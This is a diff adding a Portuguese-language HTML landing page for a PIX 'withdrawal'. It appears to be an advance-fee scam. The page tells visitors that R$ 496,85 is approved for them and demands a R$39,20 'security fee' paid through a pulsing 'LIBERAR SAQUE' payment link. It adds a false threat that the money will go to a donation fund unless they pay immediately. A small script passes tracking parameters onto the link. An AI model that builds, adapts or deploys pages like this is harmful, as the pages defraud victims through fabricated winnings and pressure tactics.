@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Página de Saque PIX</title>
+  <link rel="icon" href="https://i.postimg.cc/VsDvqK2q/image.png">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      color: #fff;
+      background-color: #000;
+      text-align: center;
+    }
+
+    /* Seção de Atenção */
+    .warning {
+      background-color: #ff0000;
+      color: #ffffff;
+      padding: 15px;
+      font-weight: bold;
+    }
+
+    /* Seção de Valor */
+    .value-section {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px;
+      margin-top: 20px;
+    }
+
+    .value-section img {
+      width: 120px;
+    }
+
+    .value-box {
+      font-size: 1.5em;
+      font-weight: bold;
+      color: #00ff00;
+      border: 2px solid #00ff00;
+      padding: 5px 5px;
+      border-radius: 10px;
+    }
+
+    /* Título Centralizado */
+    h1 {
+      color: #00ff00;
+      font-size: 2em;
+      margin: 20px 0;
+    }
+
+    /* Texto Principal */
+    .main-text {
+      color: #ffffff;
+      font-size: 1.1em;
+      padding: 20px;
+      margin: 20px auto;
+      width: 80%;
+      background-color: #222;
+      border-radius: 10px;
+    }
+
+    .highlight-green {
+      color: #00ff00;
+      font-weight: bold;
+    }
+
+    .highlight-red {
+      color: #ff0000;
+      font-weight: bold;
+    }
+
+    /* Botão de Liberação de Saque */
+    .pulsing-button {
+      display: inline-block;
+      background-color: #00ff00;
+      color: black;
+      font-weight: bold;
+      padding: 15px 30px;
+      margin-top: 20px;
+      text-decoration: none;
+      border-radius: 5px;
+      animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% {
+        transform: scale(1);
+      }
+      50% {
+        transform: scale(1.1);
+      }
+    }
+
+    /* FAQ */
+    .faq-section {
+      background-color: #111;
+      padding: 20px;
+      margin-top: 20px;
+      border-radius: 10px;
+    }
+
+    .faq-section h2 {
+      color: #ff0000;
+      font-size: 1.5em;
+      margin-bottom: 10px;
+    }
+
+    .faq-item {
+      color: #ffffff;
+      font-weight: bold;
+      font-size: 1.1em;
+      margin-top: 10px;
+    }
+
+    /* Rodapé */
+    .footer {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 20px;
+      padding: 20px;
+      background-color: #111;
+    }
+
+    .footer img {
+      width: 80px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Seção de Atenção -->
+  <div class="warning">
+    ATENÇÃO: CASO NÃO TRANSFIRA O DINHEIRO DE IMEDIATO, ELE SERÁ ENVIADO PARA UM FUNDO DE DOAÇÃO E VOCÊ PERDERÁ 100% DO VALOR!
+  </div>
+
+  <!-- Seção de Valor com Logo e Valor Destacado -->
+  <div class="value-section">
+    <img src="https://i.postimg.cc/9QrDFsX8/image.webp" alt="Logo">
+    <div class="value-box">
+      Valor: R$ 496,85
+    </div>
+  </div>
+
+  <!-- Título Centralizado -->
+  <h1>PIX CADASTRADO</h1>
+
+  <!-- Texto Principal com Destaques -->
+  <div class="main-text">
+    Seu PIX foi <span class="highlight-green">cadastrado</span> e <span class="highlight-green">aprovado</span> para receber o saque.<br><br>
+    Mas por <span class="highlight-red">motivos de segurança</span>, para receber seu dinheiro é necessário pagar uma pequena <span class="highlight-green">taxa de segurança de R$39,20</span> para realizarmos a Transferência.<br><br>
+    Após pagar, o seu saque será <span class="highlight-green">pago automaticamente</span> na chave cadastrada.
+  </div>
+
+  <!-- Botão de Liberação de Saque -->
+  <a href="https://go.perfectpay.com.br/PPU38CP7I0D" class="pulsing-button">LIBERAR SAQUE</a>
+
+  <!-- Seção FAQ -->
+  <div class="faq-section">
+    <h2>✎ DÚVIDAS FREQUENTES:</h2>
+    <p class="faq-item">Por que devo pagar essa taxa?</p>
+    <p class="faq-item">O que acontece se eu não pagar a taxa?</p>
+  </div>
+
+  <!-- Seção de Rodapé -->
+  <div class="footer">
+    <img src="https://i.postimg.cc/c1tgSpHF/image.png" alt="Imagem 1">
+    <img src="https://i.postimg.cc/HsGJs68d/image.png" alt="Imagem 2">
+  </div>
+<!-- Script Utms -->
+            <script>
+            // Função para adicionar os parâmetros aos links
+            function adicionarParametrosAosLinks() {
+                const urlParams = new URLSearchParams(window.location.search);
+
+                const links = document.querySelectorAll('a');
+
+                links.forEach(link => {
+                    const href = new URL(link.href);
+                    urlParams.forEach((value, key) => {
+                        href.searchParams.set(key, value);
+                    });
+                    link.href = href.toString();
+                });
+            }
+
+            // Chamar a função ao carregar a página
+            document.addEventListener('DOMContentLoaded', adicionarParametrosAosLinks);
+            </script>
+  <!-- Script Utms -->
+</body>
+</html>
